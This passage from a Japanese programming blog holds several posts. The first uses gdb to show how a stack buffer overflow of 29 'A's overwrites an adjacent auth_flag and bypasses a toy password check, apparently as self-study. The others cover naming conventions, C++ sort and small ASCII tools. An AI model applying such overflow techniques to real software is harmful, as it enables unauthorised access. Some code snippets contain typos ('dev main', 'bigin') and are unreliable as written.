+<p><a href="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-26-at-14.15.36.png" rel="image_group"><img class="alignnone size-large wp-image-156" alt="Screen Shot 2013-02-26 at 14.15.36" src="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-26-at-14.15.36.png?resize=625%2C680" data-recalc-dims="1" /></a></p>
+
+<p>さきほどコンパイルした実行ファイルのソースが表示されてますね。ちょっと参考書と全く同じ流れを再現しているだけなので、退屈ですが、仕方ない・・・・。11行目のpassword_bufferへの文字列コピーと、check()関数のreturnでブレイクポイントを仕込んでおきます。(password_bufferの状態を、strcpy()関数の前後でどう変化しているかを確認するため)</p>
+
+<p>break &lt;整数n>でn行目にブレイクポイントを設定できます。</p>
+
+<p><a href="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-26-at-14.33.44.png" rel="image_group"><img class="alignnone size-full wp-image-158" alt="Screen Shot 2013-02-26 at 14.33.44" src="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-26-at-14.33.44.png?resize=860%2C174" data-recalc-dims="1" /></a>この状態からプログラムを実行してみます。実行はrunコマンドです。（runのあとに任意の文字列を与えることで、通常に実行するときの引数を与える動作と同じになります。）</p>
+
+<p><a href="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-26-at-20.05.44.png" rel="image_group"><img class="alignnone size-large wp-image-159" alt="Screen Shot 2013-02-26 at 20.05.44" src="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-26-at-20.05.44.png?resize=625%2C133" data-recalc-dims="1" /></a></p>
+
+<p>runコマンドを使って実行すると、最初のブレイクポイントで処理が止まります。この状態で、現在の状態を確認していきます。</p>
+
+<p>x/fmtコマンドを利用することで、現在のメモリの状態を確認できます。（fmtは表示フォーマットを指定します。gdbコマンドに関しては、完全に忘れてしまったので、改めてまとめブログ書こうと思います。）</p>
+
+<p>ひとまず x/fmtコマンドだけまとめ</p>
+
+<pre class="lang:tex decode:true">　[gdb] x  コマンド
+・書式
+x [[/nfu] addr]
+addrにある値を表示する。
+nfuはnが繰り返し回数、fが表示フォーマット、uが表示するデータの単位バイト数を指定できる
+
+・フォーマットオプション
+a アドレスとして表示
+c 文字定数として表示
+d 符号付き10進数として表示
+f 実数として表示
+i 機械語として表示
+o 8進数として表示
+s NUL文字で終端する文字列として表示
+t 2進整数として表示
+u 符号なし10進数として表示
+x 16進数として表示
+
+・単位バイト数オプション
+b バイト
+g ジャイアントワード 8byte
+h ハーフワード 2byte
+w ワード 4byte</pre>
+
+
+<p>こんな感じですね。addrにはコード中の変数名なんかも適用できます。<a href="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-26-at-20.27.10.png" rel="image_group"><img class="alignnone size-full wp-image-161" alt="Screen Shot 2013-02-26 at 20.27.10" src="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-26-at-20.27.10.png?resize=680%2C198" data-recalc-dims="1" /></a></p>
+
+<p>つまり、</p>
+
+<p>char型[16]配列のpassword_bufferはメモリのアドレス0x7fffffffe3d0にあり、値は&#8221;\020\345\377\377\177&#8243;</p>
+
+<p>int型 auth_flagはメモリのアドレス0x7fffffffe3ecですね。</p>
+
+<p>つまり、メモリ上にint型auth_flagはchar型[16]配列password_bufferの28バイト後ろに格納されていることがわかります。</p>
+
+<p><a href="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-26-at-20.37.38.png" rel="image_group"><img class="alignnone size-large wp-image-162" alt="Screen Shot 2013-02-26 at 20.37.38" src="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-26-at-20.37.38.png?resize=625%2C151" data-recalc-dims="1" /></a>それから、password_bufferから29バイト文、メモリの中身を覗いてみます。これでpassword_bufferとauth_flagの両方の状態が見えてますね。ちなみにさっき、” x/s password_buffer”で、6byteしか表示されていなかったのは7byte目にasciiコードでNULがあったからですね。xコマンドのフォーマットsはnull文字までの文字列を表示するので、計16byteの配列で宣言していたのにも関わらず、7byte目までが表示されました。</p>
+
+<p>password_bufferは初期化していないので、NULLがいっぱい入っていたり、文字じゃないコードが入っていたりと、まぁめちゃくちゃですね。初期化していない変数とかをprintfすると変な文字が出てくるっていうのは、プログラミングの勉強始めた頃、誰もがやりますよね（笑）要するにこういうことですね。初期化前は適当なよくわからないもんが勝手に入ってます。しかし、autu_flagのほうはしっかり0で初期化しているので、そのとおりの値が入ってます。（上の画像の一番最後の0&#215;00がそうです。アドレスは0x7fffffffe3ec）</p>
+
+<p>それぞれの変数の状態が確認できました。それでは次のブレイクポイントまで処理を進めてみます。処理を継続するにはcontinueコマンドを実行します。<a href="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-26-at-20.58.06.png" rel="image_group"><img class="alignnone size-large wp-image-163" alt="Screen Shot 2013-02-26 at 20.58.06" src="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-26-at-20.58.06.png?resize=625%2C115" data-recalc-dims="1" /></a></p>
+
+<p>&nbsp;</p>
+
+<p>処理がソースコードの20行目でストップしたことがわかります。</p>
+
+<p>この時点で、checkが想定外の動作をしているため、認証を通過してしまうので、この状態で各変数をチェックしていきましょう。（デバッグ用に書いたprintf文で既に変数の中身がどうなってるかは出力されてしまっていますが、メモリ上でどのように保存されているかを確認します。int型は4byteなので28byte+4byteで32byte分表示しています。さっきミスって29byteb分しかスクショとってなかったけど、全部撮り直すのめんどくさいや・・・ｗ）</p>
+
+<p><a href="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-26-at-21.36.55.png" rel="image_group"><img class="alignnone size-large wp-image-165" alt="Screen Shot 2013-02-26 at 21.36.55" src="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-26-at-21.36.55.png?resize=625%2C93" data-recalc-dims="1" /></a></p>
+
+<p>こんな感じになってます。auth_flagのアドレスである、0x7fffffffe3ecは0&#215;41(10進数で65、asciiコードで&#8217;A&#8217;)になってますね。</p>
+
+<p>なぜこうなってしまうか、というと</p>
+
+<ol>
+<li>password_bufferがchar型[16]の配列(16byte)で宣言されメモリアドレス0x7fffffffe3d0に確保される（初期化していないため、値は不定）</li>
+<li>auth_flagがint型(4byte)で宣言され、0x7fffffffe3ecに確保される（0で初期化されているため、内容は0&#215;00000000）</li>
+<li>strcpy(password_buffer, password)が実行され、password_bufferのアドレス0x7fffffffe3d0から引数の文字列がコピーされる（Aが29個で29byte）つまり、password_bufferは16byte しか確保されてないが、0x7fffffffe3d0から29byteに&#8217;A&#8217;が書き込まれる</li>
+<li>auth_flagのアドレスは0x7fffffffe3ecはpassword_bufferから28byteなので、無論ここも&#8217;A&#8217;で上書きされる。</li>
+<li>check()関数からmain()関数にauth_flagの値がreturnされる</li>
+<li>main()関数のif文で、auth_flagが0(c++やjavaでいう、bool型false)かそれ以外かをチェック</li>
+<li>check()関数から返却された値は10進整数(int)で65(asciiコードで&#8217;A&#8217;)なのでif文はtrueで処理</li>
+<li>認証OKの出力が表示される</li>
+</ol>
+
+
+<p>こういうことですね。これがBOFの基本ですか。。。</p>
+
+<p>しかし、これだけだと、例えばauth_flagとpassword_bufferの宣言を逆にするだけで、この手法は使えなくなります。（スタックセグメントに関しても復習のために別途ブログ書きます）プログラム中に宣言された変数は、スタック状にメモリ中に確保されるため、先に宣言したほうが、アドレス値としては大きくなります。（password_bufferを先に宣言すればアドレスはauth_flagより、password_bufferが後ろにくる、ということ）これが逆になると、password_bufferの配列より大きい引数を渡して、BOFさせてもauth_flagが上書きされません。</p>
+
+<p>そういったプログラムに対するBOFは次回また自分の環境で実証して、ブログに書きたいと思います。勉強になりました・・・。</p>
+
+<p>ちなみに、macos上で再現しようとしたところ、abort trap:6と表示され、再現できませんでした・・・。メモリ上に命令として有効でない値が入ると、そのように処理が止まる、みたいな内容をぐぐったら出てきたような気がしますが、確認はしていません。</p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+  
+    
+      <h1 class="entry-title"><a href="/blog/2013/02/25/wordpress14/">Googleコーディングガイドを読みつつ、いろいろな命名規約を比較してみる</a></h1>
+      
+      
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-02-25T00:00:00+09:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Ruby on RailsのMVC命名規約ついて調べてたけど、最近よく書くc++とpythonに関してのガイドを見つけたので、その２つの言語に関して書きます。</p>
+
+<p>ちょっと流行ったオライリーのリーダブルコードも読んだんですが、相変わらず糞コード量産してしまうので、勉強です・・・orz</p>
+
+<p>あと全文紹介するだけだと、それなら本家を読んだほうがいいし、日本語訳も既に翻訳されたものがネットにいくつもあるので、今回は命名規約＋αのみです。</p>
+
+<p>更に詳しく読みたい方がいれば、本家Google Coding Guideと、それらの日本語訳を参照してください。</p>
+
+<p>読んで感じたのは、Googleで利用されている命名規約を知るだけでなく、細かい言語仕様なんかも一緒に確認できたことです。サラサラっとでも一度全部読んでみることをおすすめします。（もちろん、これらの命名規約をどこでも厳守する必要はありません。あくまでGoogleのガイドラインです。）</p>
+
+<ul>
+<li><a href="http://google-styleguide.googlecode.com/svn/trunk/pyguide.html">Google Python Style Guide : http://google-styleguide.googlecode.com/svn/trunk/pyguide.html</a></li>
+<li><a href="http://google-styleguide.googlecode.com/svn/trunk/cppguide.xml">Google C++ Style Guide : http://google-styleguide.googlecode.com/svn/trunk/cppguide.xml</a></li>
+</ul>
+
+
+<h2>Google Python Style Guide によるPython の命名規約</h2>
+
+<h3>非推奨なもの</h3>
+
+<ol>
+<li>カウンタ、イテレータ以外の１文字変数</li>
+<li>パッケージ、モジュール名のハイフン( &#8211; )</li>
+<li>二重アンダーラインで囲まれた名前(Pythonで予約された__main__などと重なるため)</li>
+</ol>
+
+
+<h3>一般的な命名</h3>
+
+<ol>
+<li>最初にアンダーバーを一つ付加すると、変数と関数を保護するための機能が提供される(import * fromでインポートできない)　(protected)</li>
+<li>最初にアンダーバーを二つ付加すると、変数や関数をプライベートにすることができる(private)</li>
+<li>ちなみに、ファイル名（＝モジュール名）はmodule_name.pyとする。多くのModuleName.pyという名前の既存モジュールが存在するが、これはモジュールがクラス名の後に命名されると混乱するので、現在は非推奨になっている。</li>
+</ol>
+
+
+<h3>命名規約</h3>
+
+<ul>
+<li>モジュール： module_name</li>
+<li>パッケージ : package_name</li>
+<li>クラス名 : ClassName</li>
+<li>メソッド名: method_name</li>
+<li>例外 : ExceptionName</li>
+<li>関数名 : function_name</li>
+<li>グローバル定数：GLOBAL_CONSTANT_NAME</li>
+<li>グローバル変数：global_var_name</li>
+<li>インスタンス変数 : instance_var_name</li>
+<li>ローカル変数：local_var_name</li>
+</ul>
+
+
+<p>メイン関数について</p>
+
+<p>ファイルは基本的にインポート可能であるべきなので、インポートにより、メイン関数が実行されないようにする。pythonにおいては、pychecker, pydocと単体テストのモジュールがインポート可能でなければならないので、、インポート時にメイン関数が実行されないように、以下のようにチェックを行うこと。</p>
+
+<pre class="lang:python decode:true">dev main():
+
+if __name__ == '__main__':
+    main()</pre>
+
+
+<p>以上がGoogle Python Style GuideのNamingの項目です。メイン関数のチェックに関しては定番ですね。テストもしやすいし、そのままインポートできます。何もなくても、これは大体書きますね。あれ、と思ったのは変数名の前のアンダーバー。ひとつ付けたときってprotectedになるんだっけ・・・？まぁなるんでしょうけど、あとで動作確認含めて、検証してみます。あとNamingの項目ではないですが、「インポートは必ず絶対パスで」と「継承のないクラスは必ずobjectを継承する」というポイントは、なるほど、と勉強になりました。</p>
+
+<p>ちなみに、クラス名、例外で用いられている記法はパスカルケース。それ以外はスネークケースですね。あと今回登場していませんが有名どこだと、キャメルケース。全然知らないけど、ハンガリアン記法なんかがありますね。次はC++いってみます。こっちはpythonより細かくて全部読むのめんどくry&#8230;.</p>
+
+<h2>Google C++ Style GuideによるC++の命名規約</h2>
+
+<h3>一般的な命名規約</h3>
+
+<ol>
+<li>関数名、変数名、ファイル名はわかりやすいものにする。無理に省略することは避ける。型や変数は名詞で、関数は命令的な動詞にするべき。</li>
+<li>プロジェクト外でも極めてよく知られている略語で無い限り、使用してはいけない。</li>
+</ol>
+
+
+<h3>ファイル名（一部省略）</h3>
+
+<ol>
+<li>ファイル名は全て小文字にするべきで、アンダーバー、ダッシュを含んでていても構わない。一貫性のあるパターンがなければアンダーバーを使うとより。</li>
+<li>c++ファイルはすべて.cc、ヘッダファイルは.hで終わるべき。</li>
+<li>db.hのように/usr/includeに存在するファイル名を使ってはいけない。</li>
+<li>ファイル名は具体的なものにする。(logs.hではなく、http_server_logs.hなど)</li>
+<li>インライン関数は.hファイルにいれなければならない。シンプルなインライン関数は直接.hファイルに書いたほうがよい。</li>
+</ol>
+
+
+<h3>型名（クラス名）</h3>
+
+<p>大文字で始めて、単語の頭文字を大文字にして、アンダーバーを使わないようにする。（パスカル記法ですね） ex: ClassName</p>
+
+<h3>変数名</h3>
+
+<ol>
+<li>全て小文字にして、単語と単語の間にはアンダーバーを入れる。クラスメンバ変数はアンダーバーで終わるようにする。構造体のデータメンバは、アンダーバーなしの通常の変数と同様に命名するべき(スネーク記法) ex: variable_name, class_member_variable_name_</li>
+<li>グローバル変数に特別な決まりはないが、グローバル変数自体、めったに使うべきではない。もし使う場合は g_ などのプレフィックスを付加し、ローカル変数と視覚的に区別しやすいように工夫すること。</li>
+</ol>
+
+
+<h3>定数名</h3>
+
+<p>kで始まり、単語の先頭を大文字にして続ける。ex : kConstNumber</p>
+
+<h3>関数名</h3>
+
+<ol>
+<li>通常の関数は大文字で始めて、単語の先頭を大文字にするべき。アンダーバーは使わない。関数がエラー時にクラッシュするなら、関数名にOrDieを付加するべき。ex : FunctionName(), CountNumbersOrDie()</li>
+<li>アクセサとミューテータ(get/set関数)は取得、または設定する変数名と一致させる。そのため、単語はそれぞれ小文字で、間にアンダーバーを入れる。ex : void set_user_id(int user_id)</li>
+</ol>
+
+
+<h3>名前空間名</h3>
+
+<p>名前空間は全て小文字で、プロジェクト名と、できればディレクトリ構造に基づいて名前をつける。</p>
+
+<h3>列挙子名</h3>
+
+<p>列挙子の名前は定数やマクロと同様にするべき。できるだけ定数と同様にするべきだが、マクロと同じにしても構わない。ex : kErrorOutOfMemory</p>
+
+<h3>マクロ名</h3>
+
+<p>一般的にはマクロを使うべきではないが、どうしても必要なら、大文字とアンダースコアだけを使った名前にする ex : define FOO_VAR &#8230;</p>
+
+<p>以上がGoogle C++ Style Guideの命名規約になります。ちょっと詳細すぎたり、限定的すぎる箇所もあったので、それは割愛させていただきました。まぁ大体はpythonと同じくパスカル記法とスネーク記法ですね。あと、マクロ、グローバル変数は原則使用しない。定数、列挙子は小文字のkから始まってから、パスカル記法、というところが一部特殊です。</p>
+
+<p>もちろん厳守する必要なないですが、個人でここまでコーディング規約決めてる人ってのもなかなかいないですね。俺も、書いてるプログラムや気分によって、いつのまにか変わってしまうこともしばしば・・・それぞれのルールには根拠もあって、Googleはこのようなコーディング規約を設けているので、特別拘りが見つかるまでは、ひとまず真似してみるのもいいと思います。</p>
+
+<p>最後におさらいしておきます</p>
+
+<p>パスカル記法　：　ClassName  （それぞれ単語の頭文字が大文字）</p>
+
+<p>スネーク記法　：   class_member_variable （それぞれ単語は全て小文字(または大文字)で、間にアンダーバー）</p>
+
+<p>キャメル記法 　：  variableName (今回出て来なかったやつ。最初の単語は小文字で、以降単語の頭文字が大文字)</p>
+
+<p>この３つは非常によく出てくる記法です。ハンガリアン記法はあんまり見かけないので省略。一応wikipediaだけでも。[<a href="http://ja.wikipedia.org/wiki/%E3%83%8F%E3%83%B3%E3%82%AC%E3%83%AA%E3%82%A2%E3%83%B3%E8%A8%98%E6%B3%95#.E3.82.B7.E3.82.B9.E3.83.86.E3.83.A0.E3.83.8F.E3.83.B3.E3.82.AC.E3.83.AA.E3.82.A2.E3.83.B3">ハンガリアン記法</a>]　よっぽど変数の中身や宣言を明確に、かつ限定的にしたいときに、数えるほどですが、使ったことあります。プログラムは書くだけでなく、読むことも仕事や勉強ですから、お互いにいいコードを見せあいたいですね、頑張ります。</p>
+
+<p>アルゴリズムの問題とかのプログラム書く時は、変数a,b,cとかやっちゃいますけどね・・・（笑）</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+  
+    
+      <h1 class="entry-title"><a href="/blog/2013/02/25/wordpress13/">ASCIIコードを暗記するためだけのクソゲーを作る</a></h1>
+      
+      
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-02-25T00:00:00+09:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>CTFの問題に挑戦するときに、binaryとかソースコード、パケットなど読む時などなど、asciiコードがついてまわります。どうにかasciiコード暗記したいなあ・・・と思って考えました。</p>
+
+<p>暇な時に作ろう、と思ったら１時間もしないで完成したのでバージョン１.0としてリリース（笑）しましたｗ</p>
+
+<p>できた瞬間に遊んで明らかにつまんなかったけど、asciiコード覚えたければ、まぁ使えるんじゃないかな。と思います。。。（笑）</p>
+
+<p>せっかくなんで、これもアップデートしていきます。</p>
+
+<p>今後確実に実装しようと思ってるのは</p>
+
+<ol>
+<li>asciiコードから文字を答えるだけじゃなく、文字からasciiコードを答えるモードの実装</li>
+<li>間違えた問題を記録して、その人の不得意な文字コードをリストにする機能</li>
+<li>ランキング機能（ユーザ名を登録して、ローカルでランキングを記録する）</li>
+<li>Extra Hard Modeの実装（現在はハードモードでもascii 0&#215;21 &#8211; 0x7eまでだけど、0&#215;00 &#8211; 0x7fまでの出題）ただ、これは解答形式はどうしようか悩む・・・</li>
+<li>流行りに乗っかってなにかしら申し訳程度のソーシャル要素取り入れたい（得意な文字をtwitterに投稿する、とかｗ）</li>
+</ol>
+
+
+<p>遊び方は簡単</p>
+
+<p><a href="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-25-at-13.00.19.png" rel="image_group"><img class="alignnone size-full wp-image-139" alt="Screen Shot 2013-02-25 at 13.00.19" src="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-25-at-13.00.19.png?resize=328%2C44" data-recalc-dims="1" /></a></p>
+
+<p>githubからダウンロードして、pythonで実行するだけ。前回の反省を生かして（笑）最初からpython3にも対応しておりますｗｗｗｗ</p>
+
+<p>全部ノリで書いた、恥ずかしい英語で説明とか出てくるので、その通りにkeyを押してあげてください。バグ発見してくれるとすごく嬉しいです。すぐに直します！！！</p>
+
+<p>みんなで楽しくasciiコードを覚えよう！！</p>
+
+<p><a href="https://github.com/KentaKomai/ascii_charset_memory_game/blob/master/game.py">ダウンロードはこちら（笑）</a></p>
+
+<p>&nbsp;</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+  
+    
+      <h1 class="entry-title"><a href="/blog/2013/02/20/wordpress12/">C++ Algorithm Sort関数の仕様を確認してみる</a></h1>
+      
+      
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-02-20T00:00:00+09:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>これの仕様を理解していなかったために、本来点数稼げる問題を落としてしまったので確認・・・今まで数字に対してしか使ってなかったことを思い出しました・・・くそぅ・・・。</p>
+
+<p>まずは簡単にプログラムかいてみます。</p>
+
+<pre class="lang:c++ decode:true">#include &lt;iostream&gt;
+#include &lt;sstream&gt;
+#include &lt;vector&gt;
+#include &lt;cstdlib&gt;
+#include &lt;ctime&gt;
+#include &lt;cmath&gt;
+
+using namespace std;
+
+class SortVerification {
+    public:
+        void strSortSample(int n) {
+            string strImages[n];
+            stringstream ss;
+            cout&lt;&lt;"str sort"&lt;&lt;endl;
+            for(int i=0; i&lt;n; i++){
+                ss&lt;&lt;i&lt;&lt;".jpg";
+                strImages[i] = ss.str();
+                cout&lt;&lt;i&lt;&lt;":"&lt;&lt;strImages[i]&lt;&lt;endl;
+                ss.str(""); //initialize ss
+            }
+        }
+        void intSortSample(int n) {
+            int min = 0;
+            int max = n;
+            int array[n];
+
+            srand(time(NULL));
+            cout&lt;&lt;"int sort"&lt;&lt;endl;
+            for(int i=min; i&lt;max; i++){
+                array[i] = min + rand() * (max-min+1.0) / (1.0+RAND_MAX);
+                cout&lt;&lt;i&lt;&lt;":"&lt;&lt;array[i]&lt;&lt;endl;
+            }
+        }
+};
+
+int main() {
+    SortVerification sv;
+    sv.strSortSample(100);
+    sv.intSortSample(100);
+    return 0;
+}</pre>
+
+
+<p>&nbsp;</p>
+
+<p>こちらを実行すると、標準出力に&#8221;0.jpg&#8221;, &#8220;1.jpg&#8221;, &#8220;2.jpg&#8221;, &#8220;3.jpg&#8221;&#8230;&#8230;&#8221;99.jpg&#8221;までが出力されます。数字のほうは、ランダムにしました。0-100の間でランダムな数字が配列に格納されます。</p>
+
+<p>ここで出力されている配列に、それぞれalgorythm::sort()を噛ませると、配列はどのようにソートされるのか、ということを確認したいと思います。</p>
+
+<p>プログラムを以下のように変えて実行します。</p>
+
+<pre class="lang:c++ decode:true">#include &lt;iostream&gt;
+#include &lt;sstream&gt;
+#include &lt;vector&gt;
+#include &lt;cstdlib&gt;
+#include &lt;ctime&gt;
+#include &lt;cmath&gt;
+
+using namespace std;
+
+class SortVerification {
+    public:
+        void strSortSample(int n) {
+            string strImages[n];
+            stringstream ss;
+            cout&lt;&lt;"str sort"&lt;&lt;endl;
+            for(int i=0; i&lt;n; i++){
+                ss&lt;&lt;i&lt;&lt;".jpg";
+                strImages[i] = ss.str();
+                cout&lt;&lt;i&lt;&lt;":"&lt;&lt;strImages[i]&lt;&lt;endl;
+                ss.str(""); //initialize ss
+            }
+            sort(strImages, strImages+n);
+            for(int i=0; i&lt;n; i++){
+                cout&lt;&lt;i&lt;&lt;":"&lt;&lt;strImages[i]&lt;&lt;endl;
+            }
+        }
+        void intSortSample(int n) {
+            int min = 0;
+            int max = n;
+            int array[n];
+
+            srand(time(NULL));
+            cout&lt;&lt;"int sort"&lt;&lt;endl;
+            for(int i=min; i&lt;max; i++){
+                array[i] = min + rand() * (max-min+1.0) / (1.0+RAND_MAX);
+                cout&lt;&lt;i&lt;&lt;":"&lt;&lt;array[i]&lt;&lt;endl;
+            }
+            sort(array, array+n);
+            for(int i=0; i&lt;n; i++){
+                cout&lt;&lt;i&lt;&lt;":"&lt;&lt;array[i]&lt;&lt;endl;
+            }
+        }
+};
+
+int main() {
+    SortVerification sv;
+    sv.strSortSample(109);
+    sv.intSortSample(109);
+    return 0;
+}</pre>
+
+
+<p>sortした後に、もう一度、配列全体を出力する処理を加えました。</p>
+
+<p>ここで出力を確認します。</p>
+
+<p>数字のほうは、ランダムに生成された数字が、昇順に並び替わってるのがわかると思います。それに対して文字列に対しては、どのように出力されているでしょう。<a href="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-20-at-12.35.53.png" rel="image_group"><img class="alignnone size-large wp-image-111" alt="Screen Shot 2013-02-20 at 12.35.53" src="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-20-at-12.35.53.png?resize=310%2C1024" data-recalc-dims="1" /></a></p>
+
+<p>すいません、これ知ってる人からしたら「今更なに言ってるんだ（笑）」なんでしょうけど、僕、最初は&#8221;1.jpg&#8221;, &#8220;2.jpg&#8221;, &#8220;3.jpg&#8221;&#8230;.ってなると思ってました・・・。なるわけないですよね・・・文字列ですから・・・。単刀直入に言うと、「辞書順」にソートされます。10の後に11ではなく、100が19の後に20ではなく、2がきていますね。とても基礎的な部分なんでしょうが、これを理解していない為に、解けなかった問題があったのでメモしておきます。</p>
+
+<p>ちなみに降順にソートしたい場合はsort()の第三引数にfunctional::greater<T>()を与えてあげればOKです。最後にそれを加えたソースがこちら。</p>
+
+<pre class="lang:default decode:true">#include &lt;iostream&gt;
+#include &lt;sstream&gt;
+#include &lt;vector&gt;
+#include &lt;cstdlib&gt;
+#include &lt;ctime&gt;
+#include &lt;cmath&gt;
+#include &lt;functional&gt;
+
+using namespace std;
+
+class SortVerification {
+    public:
+        void strSortSample(int n) {
+            string strImages[n];
+            stringstream ss;
+            cout&lt;&lt;"str sort"&lt;&lt;endl;
+            for(int i=0; i&lt;n; i++){
+                ss&lt;&lt;i&lt;&lt;".jpg";
+                strImages[i] = ss.str();
+                cout&lt;&lt;i&lt;&lt;":"&lt;&lt;strImages[i]&lt;&lt;endl;
+                ss.str(""); //initialize ss
+            }
+            sort(strImages, strImages+n);
+            for(int i=0; i&lt;n; i++){
+                cout&lt;&lt;i&lt;&lt;":"&lt;&lt;strImages[i]&lt;&lt;endl;
+            }
+            sort(strImages, strImages+n, greater&lt;string&gt;());
+            for(int i=0; i&lt;n; i++){
+                cout&lt;&lt;i&lt;&lt;":"&lt;&lt;strImages[i]&lt;&lt;endl;
+            }
+        }
+        void intSortSample(int n) {
+            int min = 0;
+            int max = n;
+            int array[n];
+
+            srand(time(NULL));
+            cout&lt;&lt;"int sort"&lt;&lt;endl;
+            for(int i=min; i&lt;max; i++){
+                array[i] = min + rand() * (max-min+1.0) / (1.0+RAND_MAX);
+                cout&lt;&lt;i&lt;&lt;":"&lt;&lt;array[i]&lt;&lt;endl;
+            }
+            sort(array, array+n);
+            for(int i=0; i&lt;n; i++){
+                cout&lt;&lt;i&lt;&lt;":"&lt;&lt;array[i]&lt;&lt;endl;
+            }
+            sort(array, array+n, greater&lt;int&gt;());
+            for(int i=0; i&lt;n; i++){
+                cout&lt;&lt;i&lt;&lt;":"&lt;&lt;array[i]&lt;&lt;endl;
+            }
+        }
+};
+
+int main() {
+    SortVerification sv;
+    sv.strSortSample(109);
+    sv.intSortSample(109);
+    return 0;
+}</pre>
+
+
+<p>algorythm.hは強力ですね。ちなみに第三引数は自分でソート順を定義することも可能だそうで、それはいづれまた必要になったときに改めて記事書いてみます。あぁ・・・悔しい・・・</p>
+
+<p><a href="https://github.com/KentaKomai/warehouse/blob/master/sortVerification/sample1.cpp">今回のコード</a></p>
+
+<p>&nbsp;</p>
+
+<p>&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;2013/02/24　追記&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8211;</p>
+
+<p>デフォルトではsort()関数は昇順にソートしますが、降順にソートしたい場合はfunctional::greaterを利用すると記述しましたが、AOJで他の参加者の方のコードを見せていただいたら以下のようにも降順ソートできるみたいです！functional.hをインクルードする必要もないので、単純に降順ソートしたい場合は便利ですね。</p>
+
+<pre class="lang:c++ decode:true ">string str("abcde");
+sort(str.bigin(), str.end());    //昇順ソート
+sort(str.rbigin(), str.rend());  //降順ソート</pre>
+
+
+<p>イテレータをそれぞれ最初の文字を末尾に、最後の文字を頭にもってきてあげてますね。so cool!</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+  
+    
+      <h1 class="entry-title"><a href="/blog/2013/02/20/wordpress11/">引数に与えられた文字列をASCIIの10進数と16進数で出力するだけのスクリプト</a></h1>
+      
+      
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-02-20T00:00:00+09:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>codegate2012のwriteupを読んでいて、「よく必要になることがあるけど、そういえば簡単にできる方法ないっけ？」と思ったので作りました。知らないだけでそういうコマンドありそうだけど、勉強になったからいっか・・・（笑）</p>
+
+<p>自分は必要になったとき、web上にある変換サービス使ってましたが、コマンドラインでさらっとできたほうが便利。</p>
+
+<p>コードは<a href="https://github.com/KentaKomai/warehouse/tree/master/convertStringToHex">こちら</a>で公開しています。</p>
+
+<p>使い方は簡単です。(python 2系のインストールが必須です)</p>
+
+<p><a href="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-20-at-13.59.00.png" rel="image_group"><img class="alignnone size-full wp-image-121" alt="Screen Shot 2013-02-20 at 13.59.00" src="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-20-at-13.59.00.png?resize=468%2C86" data-recalc-dims="1" /></a></p>
+
+<p>&nbsp;</p>
+
+<p>スクリプトの引数に、変換したい文字列を入れるだけ。オプションとかも皆無です（笑）</p>
+
+<p>これを実行してもらうと</p>
+
+<p><a href="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-20-at-13.44.59.png" rel="image_group"><img class="alignnone size-full wp-image-120" alt="Screen Shot 2013-02-20 at 13.44.59" src="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-20-at-13.44.59.png?resize=702%2C190" data-recalc-dims="1" /></a></p>
+
+<p>&nbsp;</p>
+
+<p>こんな感じで出力してくれます。中身もめっちゃシンプル（単純）。「これくらい自分で書けるよ！！」「糞コード乙！！」甘んじて受け入れます・・・orz</p>
+
